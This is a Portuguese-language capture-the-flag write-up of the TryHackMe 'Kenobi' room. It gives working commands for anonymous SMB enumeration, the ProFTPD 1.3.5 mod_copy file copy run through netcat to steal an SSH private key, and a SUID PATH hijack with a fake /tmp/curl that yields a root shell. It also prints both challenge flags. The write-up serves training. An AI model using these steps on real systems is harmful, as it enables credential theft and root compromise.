# ⭐ Kenobi — CTF Writeup
### TryHackMe | Boot-to-Root | ProFTPD 1.3.5 mod_copy · SMB Anonymous Share · SUID PATH Hijacking

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 18/08/2026                                                                             |
| **Data do Pentest**   | 18/08/2026 · 22:53 – 23:44 (GMT+0000)                                                  |
| **Alvo**              | `10.67.158.157` (`KENOBI`)  — TryHackMe · Kenobi                                       |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · smbclient · searchsploit · Netcat · SSH · Técnica de PATH Hijacking (SUID)  |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Kenobi** (TryHackMe), um host **Ubuntu 20.04.6 LTS** (hostname `KENOBI`) que expõe múltiplos serviços de rede legados e mal configurados: FTP (**ProFTPD 1.3.5**), SSH, HTTP, RPC, **Samba** (SMB) e **NFS**. A cadeia de ataque envolveu: reconhecimento de rede via **Nmap**, identificando os seis serviços expostos; enumeração de um compartilhamento **SMB anônimo**, onde um arquivo `log.txt` esquecido revelou o histórico de geração de uma chave SSH para o usuário `kenobi`; pesquisa de exploits públicos para o **ProFTPD 1.3.5**, confirmando a vulnerabilidade **`mod_copy`** de cópia arbitrária de arquivos; exploração manual via **Netcat**, utilizando os comandos `SITE CPFR`/`SITE CPTO` do FTP para copiar a chave privada SSH (`id_rsa`) do usuário `kenobi` para dentro do compartilhamento SMB público; extração dessa chave via **smbclient** e uso dela para autenticação **SSH** direta como `kenobi`, capturando a flag de usuário; e, por fim, escalada de privilégios explorando um binário **SUID customizado** (`/usr/bin/menu`) vulnerável a **sequestro de variável de ambiente PATH**, resultando em uma shell **root** e na captura da flag final.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-sV -sC`)                  |
| **smbclient**                   | -       | Enumeração e acesso ao compartilhamento SMB anônimo                                      |
| **searchsploit**                | -       | Pesquisa local de exploits públicos para ProFTPD 1.3.5                                  |
| **Netcat**                      | -       | Exploração manual da vulnerabilidade `mod_copy` via comandos FTP `SITE CPFR`/`SITE CPTO` |
| **SSH**                         | -       | Acesso inicial autenticado com a chave privada extraída                                 |
| **PATH Hijacking (SUID)**       | -       | Técnica manual de escalada de privilégios explorando o binário `/usr/bin/menu`           |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **22:53 GMT · Nmap 7.99**

```bash
nmap -sV -sC 10.67.158.157
```

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/admin.html
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
```

![Nmap](/CTFs/Kenobi/images/Nmap_Scan.png)

Seis serviços expostos, uma superfície de ataque considerável: **FTP** (ProFTPD 1.3.5, versão historicamente vulnerável), **SSH**, **HTTP** (com um diretório `/admin.html` sinalizado no `robots.txt`), **RPC**, **Samba/SMB** e **NFS**. O hostname NetBIOS confirmou o nome do host: `KENOBI`.

---

### FASE 2 — Enumeração SMB: Compartilhamento Anônimo e Vazamento de Log

A listagem de compartilhamentos SMB revelou um compartilhamento chamado **`anonymous`**, acessível sem credenciais:

```bash
smbclient -L //10.67.158.157/anonymous
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
```

Ao conectar diretamente ao compartilhamento, um arquivo `log.txt` foi encontrado e extraído:

```bash
smbclient //10.67.158.157/anonymous
smb: \> get log.txt
```

```bash
cat log.txt
```

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
...
# This is a basic ProFTPD configuration file (rename it to
# 'proftpd.conf' for actual use...
ServerName          "ProFTPD Default Installation"
ServerType          standalone
Port                21
...
```

![SMB](/CTFs/Kenobi/images/Smb_Client.png)

> 🚨 **Vazamento crítico de informação: o log confirmou a existência de uma chave privada SSH em `/home/kenobi/.ssh/id_rsa`**, além de expor o conteúdo do arquivo de configuração padrão do ProFTPD — indicando que um operador esqueceu registros sensíveis de terminal dentro de um compartilhamento SMB público.

---

### FASE 3 — Pesquisa de Exploit: ProFTPD 1.3.5

Com a versão exata do serviço FTP confirmada pelo Nmap, uma busca por exploits públicos foi realizada:

```bash
searchsploit ProFtpd 1.3.5
```

```
Exploit Title                                                     |  Path
--------------------------------------------------------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)          | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)            | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                          | linux/remote/36742.txt
```

A vulnerabilidade **`mod_copy`** do ProFTPD 1.3.5 permite que um cliente **não autenticado** execute os comandos `SITE CPFR` (copy from) e `SITE CPTO` (copy to), copiando **qualquer arquivo legível pelo processo do FTP** para qualquer destino gravável no sistema de arquivos — sem exigir credenciais.

---

### FASE 4 — Exploração: Cópia Arbitrária de Arquivos via mod_copy

Combinando a informação vazada no log (localização da chave privada em `/home/kenobi/.ssh/id_rsa`) com a vulnerabilidade `mod_copy`, o ataque foi executado manualmente via **Netcat**, copiando a chave privada de `kenobi` para dentro do compartilhamento SMB público (mapeado para `/home/kenobi/share`):

```bash
nc 10.67.158.157 21
```

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.67.158.157]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /home/kenobi/share/id_rsa
250 Copy successful
```

> 🚨 **Exploração bem-sucedida da CVE-2015-3306 (ProFTPD mod_copy) — a chave privada SSH de `kenobi` foi copiada para um local acessível via SMB, sem qualquer autenticação.**

---

### FASE 5 — Extração da Chave e Acesso Inicial via SSH

Com o arquivo `id_rsa` agora presente no compartilhamento `anonymous`, ele foi extraído via `smbclient`:

```bash
smbclient //10.67.158.157/anonymous
smb: \> ls
  id_rsa    N    1675   Tue Aug 18 23:36:07 2026
  log.txt   N    12237  Wed Sep  4 10:49:09 2019
smb: \> get id_rsa
```

Após ajustar as permissões do arquivo (requisito do cliente SSH), o acesso foi realizado diretamente:

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.67.158.157
```

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
...
kenobi@kenobi:~$
```

![SSH](/CTFs/Kenobi/images/SSH_Entry.png)

> 🚩 **Acesso inicial obtido — shell SSH autenticada como `kenobi`, sem necessidade de senha, utilizando a chave privada extraída via a combinação SMB + ProFTPD mod_copy.**

---

### FASE 6 — Captura da Flag de Usuário

```bash
kenobi@kenobi:~$ ls
share  user.txt

kenobi@kenobi:~$ cat user.txt
```

```
d0b0f3f53b6caa532a83915e19224899
```

![Flag User](/CTFs/Kenobi/images/Flag_User.png)
> 🚩 **user.txt — FLAG DE USUÁRIO CAPTURADA: `d0b0f3f53b6caa532a83915e19224899`**

---

### FASE 7 — Enumeração de Escalada de Privilégios: Binário SUID Customizado

A busca por binários com o bit **SUID** habilitado revelou, entre os resultados esperados do sistema, um binário incomum e claramente customizado para o desafio:

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/sudo
...
/usr/bin/menu   ← binário customizado, fora do padrão do sistema
```

A análise das strings embutidas no binário confirmou tratar-se de um menu interativo simples, que executa comandos do sistema **sem especificar o caminho absoluto**:

```bash
strings /usr/bin/menu
```

```
*****************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
```

![Privesc Enum](/CTFs/Kenobi/images/Enum_Privesc.png)
> 🚨 **Vulnerabilidade identificada: o binário SUID `/usr/bin/menu` invoca `curl`, `uname` e `ifconfig` sem caminho absoluto, tornando-o vulnerável a sequestro da variável de ambiente `PATH` (PATH Hijacking).**

---

### FASE 8 — Exploração: PATH Hijacking

Um binário malicioso chamado `curl` foi criado em um diretório gravável, projetado para simplesmente abrir uma shell (`/bin/sh`) em vez de realizar uma requisição HTTP:

```bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
```

Com a variável `PATH` manipulada para priorizar `/tmp`, o binário SUID `/usr/bin/menu` foi executado, e a opção **"1. status check"** (que internamente chama `curl -I localhost`) foi selecionada:

```bash
/usr/bin/menu
```

```
*****************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
```

Como `/usr/bin/menu` possui o bit **SUID** habilitado (pertencente a `root`) e resolveu `curl` através do `PATH` manipulado, o `/bin/sh` malicioso foi executado com privilégios de **root**:

```bash
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```


> 🚩 **Escalada de privilégios bem-sucedida via PATH Hijacking — shell obtida com `uid=0(root)`**

---

### FASE 9 — Captura da Flag Final (Root)

```bash
# pwd
/tmp
# cd /root
# ls
root.txt  snap
# cat root.txt
```

```
177b3cd8562289f37382721c28381f02
```

![Root Flag](/CTFs/Kenobi/images/Privesc-_Root_Flag.png)
> 🚩 **root.txt — FLAG FINAL CAPTURADA: `177b3cd8562289f37382721c28381f02`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[22:53 GMT] FASE 1 — RECONHECIMENTO (Nmap)
    FTP (21), SSH (22), HTTP (80), RPC (111), SMB (139/445), NFS (2049)
    Host: KENOBI
    ↓
[FASE 2] ENUMERAÇÃO SMB
    Compartilhamento "anonymous" → log.txt vazado
    Revela: /home/kenobi/.ssh/id_rsa + config do ProFTPD
    ↓
[FASE 3] PESQUISA DE EXPLOIT
    ProFTPD 1.3.5 → vulnerabilidade mod_copy (CVE-2015-3306)
    ↓
[FASE 4] EXPLORAÇÃO (Netcat)
    SITE CPFR /home/kenobi/.ssh/id_rsa
    SITE CPTO /home/kenobi/share/id_rsa
    ↓
[23:36 GMT] FASE 5 — ACESSO INICIAL
    smbclient → download de id_rsa
    ssh -i id_rsa kenobi@10.67.158.157
    ↓
[FASE 6] FLAG DE USUÁRIO
    FLAG: d0b0f3f53b6caa532a83915e19224899 ✓
    ↓
[FASE 7] ENUMERAÇÃO DE PRIVESC
    find SUID → /usr/bin/menu (binário customizado)
    strings → chamadas sem caminho absoluto (curl, uname, ifconfig)
    ↓
[23:44 GMT] FASE 8 — EXPLORAÇÃO (PATH Hijacking)
    /tmp/curl malicioso + PATH manipulado + /usr/bin/menu (SUID root)
    id → uid=0(root)
    ↓
[FASE 9] FLAG FINAL (ROOT)
    FLAG: 177b3cd8562289f37382721c28381f02 ✓
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso total como root
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap | FTP, SSH, HTTP, RPC, SMB, NFS expostos — host `KENOBI` |
| Enumeração SMB | smbclient (`anonymous`) | `log.txt` vazado revelando caminho da chave SSH de `kenobi` |
| Pesquisa de Vulnerabilidade | searchsploit | ProFTPD 1.3.5 — `mod_copy` Command Execution |
| Exploração | Netcat (`SITE CPFR`/`SITE CPTO`) | Cópia da chave privada `id_rsa` para o compartilhamento SMB |
| Acesso Inicial | SSH (chave extraída) | Login como `kenobi` sem senha |
| Flag de Usuário | `cat user.txt` | Flag: `d0b0f3f53b6caa532a83915e19224899` |
| Enumeração de Privesc | `find -perm -u=s` + `strings` | Binário SUID customizado `/usr/bin/menu` vulnerável a PATH Hijacking |
| Escalada de Privilégios | PATH Hijacking (`curl` malicioso) | Shell root via `/usr/bin/menu` |
| Flag Final | `cat root.txt` | Flag: `177b3cd8562289f37382721c28381f02` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.67.158.157` (`KENOBI`) | Máquina Kenobi (TryHackMe) — Ubuntu 20.04.6 LTS |
| Serviços expostos | `21/FTP` · `22/SSH` · `80/HTTP` · `111/RPC` · `139,445/SMB` · `2049/NFS` | Superfície de ataque total |
| Serviço vulnerável | ProFTPD 1.3.5 | Vulnerável à `mod_copy` Command Execution (CVE-2015-3306) |
| Compartilhamento SMB exposto | `anonymous` (mapeado para `/home/kenobi/share`) | Acessível sem autenticação |
| Arquivo vazado | `log.txt` | Revelou o caminho da chave privada SSH de `kenobi` |
| Arquivo sensível copiado | `/home/kenobi/.ssh/id_rsa` | Exfiltrado via `mod_copy` para o compartilhamento público |
| Credencial obtida | Chave privada SSH de `kenobi` | Utilizada para acesso direto via SSH |
| Binário SUID vulnerável | `/usr/bin/menu` | Chama `curl`, `uname`, `ifconfig` sem caminho absoluto |
| Técnica de escalada | PATH Hijacking | `/tmp/curl` malicioso priorizado via manipulação da variável `PATH` |
| Flag 1 (user) | `d0b0f3f53b6caa532a83915e19224899` | `/home/kenobi/user.txt` |
| Flag 2 (root) | `177b3cd8562289f37382721c28381f02` | `/root/root.txt` |
| Técnica (MITRE ATT&CK) | `T1210` | Exploitation of Remote Services (ProFTPD mod_copy) |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files (log.txt no SMB) |
| Técnica (MITRE ATT&CK) | `T1574.007` | Hijack Execution Flow: Path Interception by PATH Environment Variable |

---

## ✅ Resumo das Flags

| # | Flag | Valor | Localização |
|---|------|-------|-------------|
| 🚩 Flag 1 (user) | `user.txt` | `d0b0f3f53b6caa532a83915e19224899` | `/home/kenobi/user.txt` |
| 🚩 Flag 2 (root) | `root.txt` | `177b3cd8562289f37382721c28381f02` | `/root/root.txt` |

---

## 📚 Referências

- [TryHackMe — Kenobi](https://tryhackme.com/room/kenobi)
- [CVE-2015-3306 — ProFTPD mod_copy Command Execution](https://nvd.nist.gov/vuln/detail/CVE-2015-3306)
- [Exploit-DB — ProFTPD 1.3.5 mod_copy Remote Command Execution](https://www.exploit-db.com/exploits/36803)
- [GTFOBins — PATH Hijacking Concepts](https://gtfobins.github.io/)
- [MITRE ATT&CK T1210 — Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)
- [MITRE ATT&CK T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1574.007 — Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007/)

---